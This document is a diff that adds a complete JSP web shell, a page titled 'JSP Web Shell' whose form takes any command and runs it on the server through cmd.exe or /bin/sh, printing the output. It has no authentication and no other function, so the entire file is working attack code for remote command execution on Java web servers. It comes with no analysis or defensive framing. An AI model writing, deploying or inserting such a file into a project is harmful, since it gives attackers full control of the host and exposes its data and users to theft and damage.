@@ -1,0 +1,39 @@
+<%@page import="java.lang.*, java.io.*, java.net.*, java.util.*"%>
+<html>
+<head>
+    <title>JSP Web Shell</title>
+</head>
+<body>
+    <h1>JSP Remote Command Execution</h1>
+    <form METHOD="POST" NAME="myform" ACTION="">
+        <input TYPE="text" NAME="shell" size="80" placeholder="Enter command">
+        <input TYPE="submit" VALUE="Execute">
+    </form>
+    <pre>
+    <%
+    String shellPath;
+    if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+        shellPath = "cmd.exe";
+    } else {
+        shellPath = "/bin/sh";
+    }
+
+    if (request.getParameter("shell") != null) {
+        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
+        Process p;
+        if (shellPath.equals("cmd.exe")) {
+            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
+        } else {
+            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
+        }
+        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            out.println(line);
+        }
+    }
+    %>
+    </pre>
+</body>
+</html>
+
